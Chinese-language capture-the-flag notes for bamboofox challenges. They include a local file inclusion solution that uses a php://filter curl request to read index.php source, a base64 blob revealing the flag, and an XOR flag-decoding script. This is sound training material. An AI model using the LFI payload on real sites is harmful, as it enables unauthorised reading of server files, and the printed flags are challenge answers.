# bamboofox.cs.nctu.edu.tw

[toc]

## AIS3 web 1 [50] (Solve)

1. 分析連結可能含有 LFI 問題，輸入 ././ 測試
2. http://bamboofox.cs.nctu.edu.tw:11300/?page=././about
3. 採用 php://filter 構造相關參數
   1. curl 'http://bamboofox.cs.nctu.edu.tw:11300/?page=php://filter/convert.base64-encode/resource=index'
4. `echo 'PGEgaHJlZj0nP3BhZ2U9YWJvdXQnPiBhYm91dCA8L2E+IDxiciAvPgo8YSBocmVmPSc/cGFnZT10ZXN0Jz4gdGVzdCA8L2E+IDxiciAvPgo8YnI+Cjxicj4KPD9waHAKCiAgICAgICAgJHBhZ2UgPSAkX0dFVFsncGFnZSddOwoKICAgICAgICAkcGFnZSA9ICRwYWdlIC4gJy5waHAnOwogICAgICAgICRwYWdlID0gc3RyX3JlcGxhY2UoIi4uLyIsICIiLCAkcGFnZSk7CiAgICAgICAgaW5jbHVkZSggJHBhZ2UgKTsKCiAgICAgICAgLy8gdGhlIGtleSBpcyBCQU1CT09GT1h7cGhwX3dyYXBwZXJfcm9ja3N9Cg==' | base64 -d`
5. 解碼獲得 index.php 並且獲得 flag

## AIS3 web 3 [100]

1. 起手勢，透過 wappalyzer 分析服務
2. 簡略 fuzz 一下之後發現存在 /web3/admin/ 並且會被轉址，透過 curl 也只是看到轉址的 script

## [Reverse] 0x00 C [100] (Solve)

``` python
xor_flag = [72, 75, 71, 72, 69, 69, 76, 69, 82, 113, 105, 58, 110, 57, 85, 120, 57, 124, 59, 57, 125, 59, 100, 109, 85, 59, 100, 85, 105, 119]
flag = ""
for c in xor_flag:
  flag += chr(c ^ 10)

print(flag)
```



## little-asm [50]

用 angr 解，無法直接獲得 flag

需要增加 約束條件